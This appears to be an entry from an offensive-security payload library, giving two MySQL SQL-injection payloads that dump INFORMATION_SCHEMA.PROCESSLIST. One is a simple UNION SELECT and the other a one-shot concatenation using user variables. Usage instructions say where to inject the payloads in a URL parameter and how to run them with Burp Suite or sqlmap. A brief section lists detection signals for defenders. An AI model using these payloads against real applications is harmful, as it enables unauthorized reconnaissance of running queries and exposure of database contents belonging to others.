---
id: 89bc737a-9ec3-4729-ad7c-6829d068a6e7
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:34.743525+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - mysql-injection
  - sql-injection
  - processlist-enumeration
platforms:
  - MySQL
validated: true
---

# MySQL-Union-Select-Processlist-Dump

## Code

```sql
union SELECT 1,state,info,4 FROM INFORMATION_SCHEMA.PROCESSLIST #

-- Dump in one shot example for the table content.
union select 1,(select(@)from(select(@:=0x00),(select(@)from(information_schema.processlist)where(@)in(@:=concat(@,0x3C62723E,state,0x3a,info))))a),3,4 #
```

## Description

This SQL code snippet provides two payloads for exploiting SQL injection vulnerabilities in MySQL applications to dump the contents of the INFORMATION_SCHEMA.PROCESSLIST table. The first payload uses a standard UNION SELECT to extract individual rows of active connections, focusing on the 'state' (current operation) and 'info' (running query) columns. The second payload is a more advanced one-shot concatenation that aggregates all states and infos into a single field using MySQL user variables (@), separated by HTML line breaks (<br>) for easier parsing in web responses. These are used in reconnaissance to reveal ongoing database activities without needing elevated privileges.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| None | This is a static payload; adjust column count (1, state, info, 4) to match the vulnerable query's structure. Hex values like 0x3C62723E represent '<br>' for concatenation. | N/A |

## Usage

Inject these payloads into a vulnerable parameter (e.g., URL query string like `?id=1[INJECT HERE]`) after confirming SQLi and column count. The first is suitable for row-by-row extraction in error-based or union-based injections. The second is ideal for blind injections where only one response is possible, as it compacts the entire processlist. Use in tools like Burp Suite or sqlmap with `--technique=U` for union-based attacks. Always comment out the original query with # or -- to prevent syntax errors.

## Detection

- Monitor application logs for queries accessing INFORMATION_SCHEMA.PROCESSLIST or using UNION SELECT.
- WAF rules can flag keywords like 'INFORMATION_SCHEMA', 'PROCESSLIST', or variable assignments (@:=).
- Anomalous response times or content lengths in web traffic indicating concatenated dumps.
- Database audit logs showing unexpected SELECTs from system views by low-privilege users.

## Related

- [[procedures/MySQL-Injection-Current-Queries]]
